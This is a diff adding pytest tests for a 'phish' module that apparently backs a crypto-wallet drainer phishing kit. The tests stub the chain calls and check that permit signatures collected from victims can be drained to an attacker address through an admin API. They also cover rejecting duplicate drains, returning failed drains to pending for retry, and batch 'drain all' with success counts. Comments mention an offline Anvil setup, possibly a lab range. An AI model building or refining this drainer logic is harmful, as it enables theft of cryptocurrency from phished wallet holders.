@@ -24,9 +24,23 @@ KEY = yaml.safe_load(EXAMPLE.read_text())["server"]["admin_key"]
 
 
 @pytest.fixture()
-def server():
+def server(monkeypatch):
     cfg = phish.load_config(str(EXAMPLE))
     phish.Handler.cfg = cfg
+    # 离线密闭:余额/交易打桩且带状态守恒(转账会真实增减),L1 不依赖本机是否有 Anvil
+    balances = {}
+
+    def stub_balance(url, token, holder):
+        return balances.get(holder.lower(), 10**21)
+
+    def stub_drain(url, token, victim, amount, key, attacker="0x" + "00" * 20):
+        balances[victim.lower()] = balances.get(victim.lower(), 10**21) - amount
+        balances[attacker.lower()] = balances.get(attacker.lower(), 10**21) + amount
+        return None
+
+    monkeypatch.setattr(phish.drain, "balance_of", stub_balance)
+    monkeypatch.setattr(phish.drain, "send", lambda *a, **k: "0xstub")
+    monkeypatch.setattr(phish.drain, "drain", stub_drain)
     httpd = ThreadingHTTPServer(("127.0.0.1", 0), phish.Handler)
     thread = __import__("threading").Thread(target=httpd.serve_forever, daemon=True)
     thread.start()
@@ -187,6 +201,63 @@ class TestEventFlow:
                                       "sig": sig, "value": hex(5), "deadline": "1", "nonce": "0"})
         state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
         assert state["balances"]["victim"]["address"] == "0x" + "ef" * 20
+
+    def test_state_degrades_when_chain_down(self, server, monkeypatch):
+        def boom(*a, **k):
+            raise RuntimeError("connection refused")
+        monkeypatch.setattr(phish.drain, "balance_of", boom)
+        status, state = _get(server + f"/admin/api/state?key={KEY}")
+        state = json.loads(state)
+        assert status == 200 and state["balances"] is None
+        assert "链不可达" in state["balance_error"]
+
+
+class TestDrainGuard:
+    def _permit_item(self, server, owner="0x" + "ab" * 20, value=hex(10**21)):
+        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
+        _, body = _post(server + "/api/event", {"type": "permit", "owner": owner,
+                                                "sig": sig, "value": value,
+                                                "deadline": "1893456000", "nonce": "0"})
+        return body["itemId"]
+
+    def test_success_then_duplicate_rejected(self, server):
+        item_id = self._permit_item(server)
+        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert status == 200 and result["drained"] == 10**21
+        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert status == 200 and "error" in result
+
+    def test_failure_returns_error_and_reverts_to_pending(self, server):
+        item_id = self._permit_item(server)
+        orig = phish.drain.send
+        phish.drain.send = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("链上 revert"))
+        try:
+            status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        finally:
+            phish.drain.send = orig
+        assert status == 200 and "revert" in result["error"]
+        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
+        item = next(i for i in state["items"] if i["id"] == item_id)
+        assert item["status"] == "pending"  # 回到待收割,可重试
+
+    def test_drain_all_counts_success_and_failure(self, server):
+        id_ok = self._permit_item(server)
+        id_bad = self._permit_item(server, owner="0x" + "cd" * 20)
+        orig = phish.drain.drain
+        calls = {"n": 0}
+        def flaky(*a, **k):
+            calls["n"] += 1
+            if calls["n"] == 1:
+                raise RuntimeError("余额为 0")
+            return None
+        phish.drain.drain = flaky
+        try:
+            status, result = _post(server + f"/admin/api/drain?key={KEY}", {"all": True})
+        finally:
+            phish.drain.drain = orig
+        assert status == 200
+        assert result["drained_count"] == 1 and len(result["results"]) == 2
+        assert any("error" in r for r in result["results"])
 
     def test_bad_request_does_not_kill_server(self, server):
         req = urllib.request.Request(server + "/api/event", data=b"not json",
